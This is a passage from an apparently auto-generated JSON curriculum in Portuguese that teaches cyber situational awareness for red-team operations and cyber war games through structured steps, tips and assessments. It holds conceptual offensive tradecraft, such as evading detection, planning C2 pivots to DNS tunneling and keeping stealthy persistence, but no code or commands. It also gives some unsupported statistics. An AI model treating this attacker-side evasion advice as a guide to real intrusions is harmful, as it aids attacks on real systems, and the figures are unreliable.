                                  "title": "Compreender o Conceito de Nível de Projeção na Consciência Situacional Cibernética",
                                  "subSteps": [
                                    "Estude os três níveis da consciência situacional cibernética: percepção, compreensão e projeção.",
                                    "Analise definições e exemplos de projeção em contextos militares e cibernéticos.",
                                    "Identifique a importância da projeção para antecipar respostas adversárias.",
                                    "Revise modelos como o de Endsley adaptado para ciberespaço.",
                                    "Discuta casos históricos de falhas em projeção durante incidentes cibernéticos."
                                  ],
                                  "verification": "Resuma em um parágrafo os componentes chave do nível de projeção e sua relevância em operações cibernéticas.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Artigo de Endsley sobre Consciência Situacional",
                                    "Documentação de SC-06",
                                    "Vídeos tutoriais sobre CS em cibersegurança"
                                  ],
                                  "tips": "Use diagramas para visualizar os níveis hierárquicos e foque em exemplos cibernéticos reais.",
                                  "learningObjective": "Dominar a teoria do nível de projeção e sua aplicação em cenários de ataque.",
                                  "commonMistakes": [
                                    "Confundir projeção com percepção atual",
                                    "Ignorar fatores humanos nas projeções"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Mapear o Ambiente Cibernético Atual",
                                  "subSteps": [
                                    "Colete dados sobre ativos, vulnerabilidades e defesas atuais (redes, hosts, firewalls).",
                                    "Crie um diagrama de rede e fluxo de tráfego do ambiente alvo.",
                                    "Identifique atores defensivos e suas capacidades conhecidas.",
                                    "Registre métricas atuais como latência, tráfego e logs de segurança.",
                                    "Avalie o estado baseline usando ferramentas de reconnaissance."
                                  ],
                                  "verification": "Produza um mapa visual do ambiente atual com pelo menos 5 elementos chave identificados.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Ferramentas como Nmap, Wireshark",
                                    "Templates de mapeamento de rede",
                                    "Acesso a ambiente de simulação (ex: Cyber Range)"
                                  ],
                                  "tips": "Priorize dados passivos para evitar detecção precoce.",
                                  "learningObjective": "Construir uma baseline precisa do ambiente para fundamentar projeções.",
                                  "commonMistakes": [
                                    "Mapear apenas ativos ofensivos, ignorando defesas",
                                    "Usar dados desatualizados"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Identificar Variáveis e Tendências Influenciadoras",
                                  "subSteps": [
                                    "Liste variáveis internas (atualizações de software, mudanças de equipe) e externas (ameaças emergentes, regulamentações).",
                                    "Analise tendências históricas de respostas defensivas em incidentes semelhantes.",
                                    "Modele probabilidades de eventos usando ferramentas de análise de risco.",
                                    "Considere impactos de IA/ML em detecção de anomalias.",
                                    "Priorize variáveis de alto impacto com matriz de risco."
                                  ],
                                  "verification": "Crie uma tabela de 10 variáveis com probabilidades e impactos estimados.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Planilhas Excel/Google Sheets para matriz de risco",
                                    "Relatórios de threat intelligence (ex: MITRE ATT&CK)",
                                    "Ferramentas como RiskWatch"
                                  ],
                                  "tips": "Use dados de fontes confiáveis como threat feeds para embasar tendências.",
                                  "learningObjective": "Reconhecer fatores dinâmicos que alteram o ambiente cibernético.",
                                  "commonMistakes": [
                                    "Subestimar variáveis humanas como fadiga de analistas",
                                    "Focar apenas em tech, ignorando políticas"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Projetar Estados Futuros e Prever Respostas Defensivas",
                                  "subSteps": [
                                    "Desenvolva 3-5 cenários futuros baseados nas variáveis identificadas.",
                                    "Simule respostas defensivas prováveis (ex: isolamento de rede, hunting).",
                                    "Calcule timelines para cada cenário usando modelagem temporal.",
                                    "Avalie impactos nos objetivos de ataque.",
                                    "Refine projeções com iterações baseadas em feedback."
                                  ],
                                  "verification": "Gere relatórios de cenários com previsões de respostas e probabilidades.",
                                  "estimatedTime": "2.5 horas",
                                  "materials": [
                                    "Software de simulação como Cyber Cuckoo ou custom scripts Python",
                                    "Templates de scenario planning"
                                  ],
                                  "tips": "Incorpore incertezas com ranges de probabilidade (ex: 40-60%).",
                                  "learningObjective": "Gerar projeções realistas de evoluções cibernéticas.",
                                  "commonMistakes": [
                                    "Projeções estáticas sem considerar adaptações defensivas",
                                    "Excesso de otimismo em cenários favoráveis"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Planejar Pivôs e Estratégias de Adaptação",
                                  "subSteps": [
                                    "Defina pivôs táticos para cada cenário projetado (ex: mudança de C2).",
                                    "Crie planos de contingência com triggers baseados em indicadores.",
                                    "Teste pivôs em simulação rápida.",
                                    "Avalie riscos de cada pivô e mitigações.",
                                    "Documente o plano completo de projeção e pivôs."
                                  ],
                                  "verification": "Elabore um plano de pivôs com 3 cenários testados em simulação.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Ambiente de simulação (ex: AWS Cyber Range)",
                                    "Templates de plano de contingência"
                                  ],
                                  "tips": "Mantenha pivôs simples e reversíveis para agilidade.",
                                  "learningObjective": "Desenvolver estratégias adaptativas baseadas em projeções.",
                                  "commonMistakes": [
                                    "Pivôs complexos que demandam tempo excessivo",
                                    "Falta de triggers claros para ativação"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um jogo de guerra cibernético simulando um ataque a uma rede corporativa, projete que após 48h de persistência, a equipe defensiva aplicará uma patch que bloqueia seu beacon C2. Planeje um pivô para um novo canal DNS tunneling, antecipando detecção via aumento de tráfego.",
                              "finalVerifications": [
                                "Descreva com precisão 3 cenários projetados e suas respostas defensivas esperadas.",
                                "Produza um mapa atualizado do ambiente com projeções de 24-72h.",
                                "Simule um pivô em ferramenta de lab e demonstre sucesso.",
                                "Explique variáveis chave influenciando uma projeção específica.",
                                "Avalie acurácia de uma projeção retrospectiva em incidente real.",
                                "Crie plano de contingência para cenário hipotético fornecido."
                              ],
                              "assessmentCriteria": [
                                "Precisão e detalhe das projeções (cobertura de variáveis >80%).",
                                "Realismo das respostas defensivas previstas (baseado em threat intel).",
                                "Viabilidade e agilidade dos pivôs planejados.",
                                "Uso adequado de ferramentas e dados para mapeamento.",
                                "Clareza na documentação de steps e verificações.",
                                "Capacidade de iterar projeções com novos dados."
                              ],
                              "crossCurricularConnections": [
                                "Estratégia Militar: Modelos de OODA Loop para projeção de movimentos inimigos.",
                                "Inteligência Artificial: Uso de ML para previsão de cenários cibernéticos.",
                                "Análise de Dados: Técnicas estatísticas para modelagem de riscos.",
                                "Psicologia: Fatores humanos em decisões defensivas.",
                                "Gestão de Projetos: Planejamento ágil e contingências."
                              ],
                              "realWorldApplication": "Em operações de Red Team durante pentests avançados ou jogos de guerra nacionais, permite antecipar contra-medidas como EDR upgrades, planejando pivôs para manter acesso persistente e completar objetivos de missão sem detecção prematura."
                            },
                            "estimatedTime": "2.5 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "2.0.2.3.1.2.1",
                              "2.0.2.3.1.2.2"
                            ]
                          },
                          {
                            "id": "2.0.2.3.1.2.4",
                            "name": "Integrar os Três Níveis",
                            "description": "Integrar percepção, compreensão e projeção em um ciclo contínuo para manter a consciência durante jogos de guerra cibernética.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Dominar a Percepção Inicial",
                                  "subSteps": [
                                    "Monitore feeds de logs em tempo real usando ferramentas de SIEM.",
                                    "Identifique anomalias básicas como tráfego incomum ou assinaturas de malware.",
                                    "Registre dados sensoriais relevantes em um dashboard compartilhado.",
                                    "Filtre ruído para focar em indicadores de comprometimento (IoCs).",
                                    "Atualize o quadro situacional com fatos observados."
                                  ],
                                  "verification": "Dashboard mostra anomalias detectadas com timestamps e evidências capturadas.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Ferramenta SIEM (ex: Splunk), logs simulados de rede, dashboard interativo.",
                                  "tips": "Use alertas automatizados para reduzir fadiga cognitiva.",
                                  "learningObjective": "Reconhecer e registrar dados perceptuais precisos em cenários cibernéticos dinâmicos.",
                                  "commonMistakes": "Ignorar falsos positivos ou sobrecarregar com dados irrelevantes."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Construir Compreensão Contextual",
                                  "subSteps": [
                                    "Analise padrões nos dados percebidos correlacionando com ameaças conhecidas.",
                                    "Avalie o impacto potencial no ambiente de jogo de guerra.",
                                    "Consulte bases de conhecimento como MITRE ATT&CK para mapear táticas.",
                                    "Colabore com equipe para validar interpretações.",
                                    "Atualize modelo mental com hipóteses testáveis."
                                  ],
                                  "verification": "Relatório de análise lista causas prováveis e impactos com evidências.",
                                  "estimatedTime": "1 hora",
                                  "materials": "MITRE ATT&CK framework, ferramenta de análise (ex: Wireshark), quadro colaborativo (ex: Miro).",
                                  "tips": "Pergunte 'por quê?' repetidamente para aprofundar a compreensão.",
                                  "learningObjective": "Interpretar dados perceptuais em contexto tático relevante.",
                                  "commonMistakes": "Assumir causalidade sem correlação ou ignorar contexto histórico."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Desenvolver Projeção Futura",
                                  "subSteps": [
                                    "Simule cenários 'e se' baseados na compreensão atual.",
                                    "Preveja movimentos do adversário usando modelos de jogo.",
                                    "Identifique vulnerabilidades futuras e oportunidades de contra-ataque.",
                                    "Priorize ações com base em probabilidades e impactos.",
                                    "Documente previsões em um plano de contingência."
                                  ],
                                  "verification": "Plano de contingência inclui 3-5 cenários projetados com probabilidades atribuídas.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Ferramenta de simulação cibernética (ex: Cyber Range), modelos probabilísticos (ex: Bayesian tools).",
                                  "tips": "Use árvores de decisão para visualizar ramificações.",
                                  "learningObjective": "Antecipar evoluções situacionais com base em compreensão integrada.",
                                  "commonMistakes": "Superestimar certezas ou subestimar variáveis imprevisíveis."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Integrar em Ciclo Contínuo",
                                  "subSteps": [
                                    "Inicie loop: Percepção alimenta Compreensão, que alimenta Projeção, que ajusta Percepção.",
                                    "Pratique iterações em simulação acelerada de jogo de guerra.",
                                    "Monitore feedback loops para refinar o ciclo.",
                                    "Ajuste em tempo real com base em novos dados.",
                                    "Avalie fluidez do ciclo após 5 iterações."
                                  ],
                                  "verification": "Registro de simulação mostra ciclo completo executado sem interrupções por 10 minutos.",
                                  "estimatedTime": "1 hora 30 minutos",
                                  "materials": "Plataforma de cyber range (ex: Persistent Cyber Range), timer para iterações.",
                                  "tips": "Mantenha respiração controlada para sustentar foco cognitivo.",
                                  "learningObjective": "Manter consciência situacional através de ciclo integrado percepção-compreensão-projeção.",
                                  "commonMistakes": "Quebrar o ciclo por foco excessivo em um nível ou pânico sob pressão."
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Refinar e Testar em Cenário Completo",
                                  "subSteps": [
                                    "Execute ciclo em jogo de guerra cibernética full-scale simulado.",
                                    "Registre métricas de desempenho por nível.",
                                    "Debriefe falhas e sucessos para otimização.",
                                    "Repita com variações de adversário.",
                                    "Integre lições em protocolo pessoal."
                                  ],
                                  "verification": "Vídeo ou log da simulação demonstra ciclo mantido com >80% acurácia.",
                                  "estimatedTime": "2 horas",
                                  "materials": "Cyber range completo, gravação de tela, equipe de debrief.",
                                  "tips": "Grave sessões para auto-análise posterior.",
                                  "learningObjective": "Aplicar ciclo integrado de forma autônoma e resiliente.",
                                  "commonMistakes": "Não iterar o suficiente ou ignorar feedback de debrief."
                                }
                              ],
                              "practicalExample": "Em um jogo de guerra cibernética simulando um ataque APT a uma rede crítica: 1) Perceba spikes de tráfego C2; 2) Compreenda como parte de uma campanha de exfiltração; 3) Projete escalada para ransomware; 4) Ciclo: Ajuste detecção, mitigue e antecipe pivôs laterais, mantendo domínio situacional.",
                              "finalVerifications": [
                                "Pode verbalizar o ciclo em <1 minuto com exemplos precisos.",
                                "Simulação mostra ciclo executado 5+ vezes sem falhas.",
                                "Identifica anomalias em tempo real com 90% acurácia.",
                                "Previsões se alinham com outcomes simulados em 80% dos casos.",
                                "Relatório integra todos níveis coerentemente.",
                                "Mantém consciência sob estresse simulado."
                              ],
                              "assessmentCriteria": [
                                "Precisão na percepção (detecção de IoCs: 90%+).",
                                "Profundidade na compreensão (análise causal válida).",
                                "Qualidade da projeção (previsões acionáveis e probabilísticas).",
                                "Fluidez do ciclo (tempo de iteração <2 min).",
                                "Resiliência sob pressão (mantém >80% performance).",
                                "Integração interdisciplinar (liga a táticas reais)."
                              ],
                              "crossCurricularConnections": [
                                "Psicologia Cognitiva: Modelos OODA loop.",
                                "Inteligência Artificial: Previsão baseada em ML.",
                                "Estratégia Militar: Teoria de jogos e wargaming.",
                                "Gestão de Riscos: Análise probabilística de ameaças.",
                                "Liderança: Tomada de decisão em equipe sob incerteza."
                              ],
                              "realWorldApplication": "Durante uma operação cibernética real de defesa ativa, como resposta a um incidente nation-state, o ciclo mantém operadores conscientes, permitindo detecção precoce de pivôs, compreensão de TTPs adversários e projeção de contra-medidas, reduzindo tempo de dwell de ameaças em 50%."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "2.0.2.3.1.2.3"
                            ]
                          }
                        ]
                      },
                      {
                        "id": "2.0.2.3.1.3",
                        "name": "Importância em Operações de Ataque Cibernético",
                        "description": "Análise da relevância da consciência situacional para sucesso em operações ofensivas, mitigando riscos e maximizando impacto.",
                        "specificSkills": [
                          {
                            "id": "2.0.2.3.1.3.1",
                            "name": "Avaliar Riscos de Falta de Consciência",
                            "description": "Identificar riscos como detecção prematura ou perda de controle em ataques devido à ausência de consciência situacional cibernética.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender o Conceito de Consciência Situacional Cibernética",
                                  "subSteps": [
                                    "Definir consciência situacional cibernética como a percepção do ambiente cibernético, compreensão de seu significado e projeção de seu estado futuro.",
                                    "Identificar os três níveis: percepção (nível 1), compreensão (nível 2) e projeção (nível 3).",
                                    "Analisar como ela se aplica especificamente em operações de ataque cibernético.",
                                    "Estudar exemplos históricos onde a falta de consciência levou a falhas operacionais.",
                                    "Mapear componentes do ambiente cibernético relevantes para ataques (redes, hosts, tráfego)."
                                  ],
                                  "verification": "Escrever um resumo de 200 palavras explicando os três níveis e sua relevância em ataques cibernéticos.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Artigo 'Endsley's Model of Situation Awareness', vídeo introdutório sobre SA em cibersegurança, diagrama de níveis de consciência.",
                                  "tips": "Use analogias militares tradicionais para facilitar a compreensão do conceito cibernético.",
                                  "learningObjective": "Dominar a definição e níveis da consciência situacional cibernética no contexto de ataques.",
                                  "commonMistakes": "Confundir com monitoramento passivo; ignorar o aspecto projetivo (previsão)."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar Riscos Comuns de Falta de Consciência",
                                  "subSteps": [
                                    "Listar riscos como detecção prematura por falta de percepção de respostas defensivas.",
                                    "Analisar perda de controle operacional devido à incompreensão do impacto das ações.",
                                    "Mapear riscos de escalada indesejada ou contra-ataques por projeção inadequada.",
                                    "Classificar riscos por gravidade: baixo (alerta falso), médio (exposição parcial), alto (missão comprometida).",
                                    "Revisar cenários reais de breaches onde SA falhou."
                                  ],
                                  "verification": "Criar uma tabela com 5 riscos identificados, suas causas e exemplos.",
                                  "estimatedTime": "60 minutos",
                                  "materials": "Casos de estudo (e.g., SolarWinds), template de tabela de riscos em Excel ou Google Sheets.",
                                  "tips": "Priorize riscos operacionais sobre técnicos para foco em ataques.",
                                  "learningObjective": "Reconhecer e categorizar riscos específicos decorrentes da ausência de consciência situacional.",
                                  "commonMistakes": "Focar apenas em riscos técnicos, ignorando humanos e procedurais."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Avaliar Impactos Potenciais dos Riscos",
                                  "subSteps": [
                                    "Quantificar impactos: tempo de detecção, perda de stealth, custo operacional.",
                                    "Simular cenários usando ferramentas de modelagem para prever consequências.",
                                    "Avaliar cadeia de eventos: de falta de SA a falha total da operação.",
                                    "Calcular probabilidades qualitativas (alta/baixa) baseadas em fatores ambientais.",
                                    "Documentar impactos em termos de objetivos da missão (confidencialidade, integridade)."
                                  ],
                                  "verification": "Produzir um relatório de avaliação de impactos para 3 riscos selecionados.",
                                  "estimatedTime": "75 minutos",
                                  "materials": "Ferramenta de simulação como MITRE ATT&CK Navigator, planilha de avaliação de riscos.",
                                  "tips": "Use matriz de probabilidade x impacto para visualização clara.",
                                  "learningObjective": "Avaliar quantitativa e qualitativamente os efeitos dos riscos de falta de SA.",
                                  "commonMistakes": "Superestimar ou subestimar impactos sem base em evidências."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Desenvolver Medidas de Mitigação",
                                  "subSteps": [
                                    "Propor ferramentas de monitoramento contínuo para percepção (e.g., SIEM adaptado).",
                                    "Definir protocolos de atualização de compreensão em tempo real durante operações.",
                                    "Criar planos de contingência para projeções falhas.",
                                    "Treinar equipes em exercícios de SA para cenários de ataque.",
                                    "Integrar métricas de SA em regras de engajamento."
                                  ],
                                  "verification": "Elaborar um plano de mitigação com pelo menos 4 medidas acionáveis.",
                                  "estimatedTime": "60 minutos",
                                  "materials": "Templates de plano de mitigação, frameworks como NIST Cybersecurity Framework.",
                                  "tips": "Garanta que medidas sejam proativas e integradas ao fluxo de ataque.",
                                  "learningObjective": "Formular estratégias práticas para mitigar riscos identificados.",
                                  "commonMistakes": "Propor soluções genéricas sem ligação aos riscos específicos."
                                }
                              ],
                              "practicalExample": "Em um exercício de jogo de guerra cibernético simulando um APT contra uma rede corporativa, o atacante injeta malware sem monitorar o tráfego de saída. Devido à falta de consciência situacional, ignora alertas de EDR do defensor, resultando em detecção prematura após 2 horas, perda de C2 e abortar da missão. Avaliando isso, identifica-se risco de 'perda de stealth' e planeja mitigação com beacons de baixo ruído.",
                              "finalVerifications": [
                                "Lista completa de pelo menos 5 riscos com causas e impactos descritos.",
                                "Relatório de avaliação com matriz de riscos preenchida.",
                                "Plano de mitigação com medidas testáveis.",
                                "Explicação correta dos níveis de consciência situacional aplicada ao contexto.",
                                "Simulação ou diagrama de um cenário de falha resolvido.",
                                "Autoavaliação de compreensão com exemplos reais."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de riscos (90% alinhado com literatura especializada).",
                                "Profundidade da análise de impactos (inclui quantitativos e qualitativos).",
                                "Criatividade e viabilidade das medidas de mitigação.",
                                "Completude da estrutura: todos substeps e campos preenchidos.",
                                "Clareza e organização do conteúdo produzido.",
                                "Integração de exemplos reais ou simulações."
                              ],
                              "crossCurricularConnections": [
                                "Gestão de Riscos Empresariais: Modelos como ISO 31000 para avaliação quantitativa.",
                                "Inteligência Artificial: Uso de ML para automação de consciência situacional.",
                                "Psicologia Cognitiva: Teoria de Endsley e vieses humanos em SA.",
                                "Estratégia Militar: Paralelos com OODA Loop em operações cibernéticas."
                              ],
                              "realWorldApplication": "Em operações como o Stuxnet, falta de consciência situacional poderia ter levado à detecção precoce pelos sistemas iranianos; avaliando riscos permite planejar persistência stealth em ataques estatais contra infraestruturas críticas."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "2.0.2.3.1.1.1"
                            ]
                          },
                          {
                            "id": "2.0.2.3.1.3.2",
                            "name": "Relacionar com Regras de Engajamento",
                            "description": "Explicar como a consciência situacional suporta o cumprimento de regras de engajamento em cenários de Red Team e jogos cibernéticos.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender Regras de Engajamento (ROE) em Operações Cibernéticas",
                                  "subSteps": [
                                    "Defina ROE como diretrizes que limitam ações ofensivas para evitar escalada desnecessária ou danos colaterais.",
                                    "Identifique componentes chave das ROE cibernéticas: alvos permitidos, métodos autorizados, limites temporais e geográficos.",
                                    "Estude exemplos de ROE em documentos como NIST SP 800-53 ou diretrizes militares cibernéticas.",
                                    "Diferencie ROE de Red Team (testes autorizados) versus operações reais (altas restrições).",
                                    "Analise violações históricas de ROE em ciberincidentes para contextualizar riscos."
                                  ],
                                  "verification": "Resuma em 3-5 frases as ROE principais e forneça um exemplo de violação hipotética.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Documentos NIST SP 800-53",
                                    "Guia de ROE do Departamento de Defesa",
                                    "Vídeos introdutórios sobre ROE cibernéticas"
                                  ],
                                  "tips": "Use analogias militares tradicionais para visualizar ROE cibernéticas, como 'tiro livre vs. regras de engajamento'.",
                                  "learningObjective": "Compreender o escopo e propósito das ROE em cenários de ataque cibernético.",
                                  "commonMistakes": [
                                    "Confundir ROE com leis gerais (ROE são operacionais específicas)",
                                    "Ignorar contexto de Red Team vs. operações reais"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Revisar Componentes da Consciência Situacional Cibernética (SA)",
                                  "subSteps": [
                                    "Descreva os níveis de SA de Endsley: percepção, compreensão e projeção no ambiente cibernético.",
                                    "Identifique elementos SA: tráfego de rede, vulnerabilidades ativas, respostas defensivas e inteligência de ameaças.",
                                    "Explique ferramentas para SA: SIEM, IDS/IPS, threat intelligence platforms como MISP.",
                                    "Pratique mapeamento de SA em um dashboard simulado de rede.",
                                    "Discuta como SA evolui dinamicamente durante uma operação."
                                  ],
                                  "verification": "Crie um diagrama simples mostrando os 3 níveis de SA com exemplos cibernéticos.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Modelo de Endsley SA",
                                    "Ferramentas gratuitas como Wireshark, Zeek",
                                    "Tutoriais de SIEM como Splunk Free"
                                  ],
                                  "tips": "Monitore um ambiente de lab (ex: TryHackMe) para observar SA em tempo real.",
                                  "learningObjective": "Dominar os pilares da SA cibernética e suas ferramentas associadas.",
                                  "commonMistakes": [
                                    "Focar só em percepção, ignorando projeção futura",
                                    "Subestimar a importância de threat intel"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Mapear Relação entre SA e Cumprimento de ROE",
                                  "subSteps": [
                                    "Explique como percepção SA identifica alvos dentro das ROE (ex: só sistemas autorizados).",
                                    "Descreva como compreensão SA avalia impactos potenciais para evitar violações.",
                                    "Ilustre projeção SA prevendo respostas inimigas e escaladas fora das ROE.",
                                    "Crie uma tabela relacionando componentes SA a cláusulas ROE específicas.",
                                    "Simule decisões: 'Dado este SA, a ação X viola ROE Y?'."
                                  ],
                                  "verification": "Desenvolva uma matriz SA-ROE com 5 cenários hipotéticos.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Planilhas Excel/Google Sheets para matrizes",
                                    "Casos de estudo de Red Team (ex: MITRE ATT&CK)",
                                    "Ferramentas de simulação como Cyber Range"
                                  ],
                                  "tips": "Pense em SA como 'GPS' que mantém a operação dentro das 'linhas de ROE'.",
                                  "learningObjective": "Relacionar explicitamente SA ao suporte e cumprimento de ROE.",
                                  "commonMistakes": [
                                    "Assumir SA estática (ela é dinâmica)",
                                    "Não considerar trade-offs entre velocidade de ataque e precisão SA"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Aplicar em Cenários de Red Team e Jogos Cibernéticos",
                                  "subSteps": [
                                    "Simule um exercício Red Team: identifique SA gaps que levam a violações ROE.",
                                    "Analise um jogo cibernético (ex: CTF) com ROE impostas e role de SA.",
                                    "Desenvolva regras para uma simulação própria incorporando SA-ROE.",
                                    "Revise debriefs de operações reais para lições aprendidas.",
                                    "Crie um checklist SA para verificação ROE pré-ação."
                                  ],
                                  "verification": "Execute uma simulação curta e documente 3 decisões baseadas em SA-ROE.",
                                  "estimatedTime": "2.5 horas",
                                  "materials": [
                                    "Plataformas como HackTheBox, TryHackMe",
                                    "Cyber Ranges gratuitos (ex: CyRIS)",
                                    "Templates de ROE para Red Team"
                                  ],
                                  "tips": "Grave sessões de simulação para review posterior.",
                                  "learningObjective": "Aplicar conceitualmente SA-ROE em contextos práticos de Red Team.",
                                  "commonMistakes": [
                                    "Priorizar velocidade sobre SA precisa",
                                    "Ignorar ROE em fases de exploit pós-inicial"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um exercício Red Team autorizado contra uma rede simulada, a SA detecta tráfego de um hospital conectado (alvo proibido por ROE). O operador projeta que um exploit poderia causar downtime crítico, optando por abortar e redirecionar para alvos permitidos, mantendo conformidade.",
                              "finalVerifications": [
                                "Explica com precisão como cada nível de SA suporta ROE.",
                                "Identifica violações potenciais em cenários dados.",
                                "Cria matrizes SA-ROE personalizadas.",
                                "Aplica corretamente em simulações Red Team.",
                                "Discute lições de casos reais.",
                                "Desenvolve checklists SA para ROE."
                              ],
                              "assessmentCriteria": [
                                "Profundidade na relação SA-ROE (80% cobertura de componentes).",
                                "Precisão em exemplos e simulações (sem erros factuais).",
                                "Criatividade em matrizes e checklists.",
                                "Capacidade de projeção dinâmica em cenários.",
                                "Integração de ferramentas reais de SA.",
                                "Clareza em explicações orais/escritas."
                              ],
                              "crossCurricularConnections": [
                                "Ética em Cibersegurança: Decisões morais sob ROE.",
                                "Análise de Riscos: Avaliação de impactos via SA.",
                                "Liderança e Tomada de Decisão: Em equipes Red Team.",
                                "Inteligência de Ameaças: Fontes para enriquecer SA.",
                                "Simulações e Gamificação: Design de jogos cibernéticos."
                              ],
                              "realWorldApplication": "Em operações de ciberdefesa ofensiva do governo ou empresas, SA garante que ataques Red Team permaneçam dentro de ROE legais e contratuais, evitando litígios, danos colaterais e escaladas geopolíticas, como visto em exercícios como Cyber Flag da NSA."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "2.0.2.3.1.2.1"
                            ]
                          },
                          {
                            "id": "2.0.2.3.1.3.3",
                            "name": "Exemplificar com Casos de Red Team",
                            "description": "Analisar exemplos de livros como 'Red Team Development and Operations' para ilustrar o impacto da consciência situacional em operações reais.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Adquirir e Revisar o Material Fonte",
                                  "subSteps": [
                                    "Obtenha uma cópia do livro 'Red Team Development and Operations' ou recursos equivalentes online.",
                                    "Identifique capítulos ou seções relevantes sobre operações de Red Team e consciência situacional.",
                                    "Leia e anote exemplos de casos reais ou simulados de operações cibernéticas.",
                                    "Crie um resumo inicial de 3-5 casos chave que envolvam decisões baseadas em awareness.",
                                    "Registre citações diretas ou referências para uso posterior."
                                  ],
                                  "verification": "Verifique se possui anotações de pelo menos 3 casos com citações do livro.",
                                  "estimatedTime": "2-3 hours",
                                  "materials": [
                                    "Livro 'Red Team Development and Operations'",
                                    "Notebook ou ferramenta de anotações (ex: Notion, Evernote)",
                                    "Acesso à internet para edições digitais"
                                  ],
                                  "tips": [
                                    "Priorize casos com falhas ou sucessos claros devido à consciência situacional.",
                                    "Use marcadores de cores para diferenciar sucessos (verde) e falhas (vermelho)."
                                  ],
                                  "learningObjective": "Familiarizar-se com fontes primárias de operações de Red Team para contextualizar exemplos reais.",
                                  "commonMistakes": [
                                    "Ler superficialmente sem anotações detalhadas.",
                                    "Ignorar contextos operacionais além do cibernético."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar o Papel da Consciência Situacional nos Casos",
                                  "subSteps": [
                                    "Para cada caso anotado, destaque elementos de consciência situacional (ex: monitoramento de rede, detecção de defesas).",
                                    "Classifique o nível de awareness: alto, médio ou baixo, com evidências do texto.",
                                    "Mapeie como a awareness influenciou o planejamento e execução da operação.",
                                    "Compare awareness entre casos de sucesso e falha.",
                                    "Crie um quadro comparativo simples (tabela) com colunas: Caso, Nível de Awareness, Resultado."
                                  ],
                                  "verification": "Confirme a existência de um quadro comparativo com pelo menos 3 casos analisados.",
                                  "estimatedTime": "1-2 hours",
                                  "materials": [
                                    "Anotações do Step 1",
                                    "Ferramenta de tabela (ex: Excel, Google Sheets, ou papel"
                                  ],
                                  "tips": [
                                    "Pergunte: 'O que o Red Team sabia sobre o ambiente alvo?' para guiar a análise.",
                                    "Foque em métricas como tempo de detecção ou evasão bem-sucedida."
                                  ],
                                  "learningObjective": "Discernir componentes específicos de consciência situacional em cenários operacionais.",
                                  "commonMistakes": [
                                    "Confundir consciência situacional com habilidades técnicas puras.",
                                    "Não quantificar o impacto com evidências textuais."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar o Impacto e Ilustrar Consequências",
                                  "subSteps": [
                                    "Descreva cenários alternativos: 'O que aconteceria sem awareness?' para cada caso.",
                                    "Quantifique impactos (ex: operação abortada em 30min devido a falta de awareness).",
                                    "Crie diagramas de fluxo mostrando como awareness levou ao sucesso/falha.",
                                    "Extraia quotes do livro que reforcem a ilustração.",
                                    "Prepare 1-2 slides ou parágrafos ilustrativos por caso."
                                  ],
                                  "verification": "Revise diagramas e descrições para cobertura de impactos em todos os casos.",
                                  "estimatedTime": "2 hours",
                                  "materials": [
                                    "Quadro comparativo do Step 2",
                                    "Ferramenta de diagramação (ex: Draw.io, Lucidchart)"
                                  ],
                                  "tips": [
                                    "Use setas em diagramas para mostrar causalidade: Awareness → Decisão → Resultado.",
                                    "Mantenha ilustrações concisas, focando em 1-2 pontos chave por caso."
                                  ],
                                  "learningObjective": "Ilustrar causalmente como consciência situacional determina outcomes em Red Team.",
                                  "commonMistakes": [
                                    "Fazer análises genéricas sem ligar diretamente ao texto.",
                                    "Sobrecarregar ilustrações com detalhes irrelevantes."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Sintetizar Lições e Preparar Exemplificação",
                                  "subSteps": [
                                    "Compile lições comuns: ex: 'Awareness previne armadilhas em 80% dos casos'.",
                                    "Crie uma narrativa coesa ligando casos à importância geral em operações de ataque.",
                                    "Desenvolva uma apresentação ou relatório final com exemplos ilustrados.",
                                    "Teste a explicação verbalmente para clareza.",
                                    "Revise para neutralidade e precisão factual."
                                  ],
                                  "verification": "Apresente o relatório a um par para feedback sobre clareza da ilustração.",
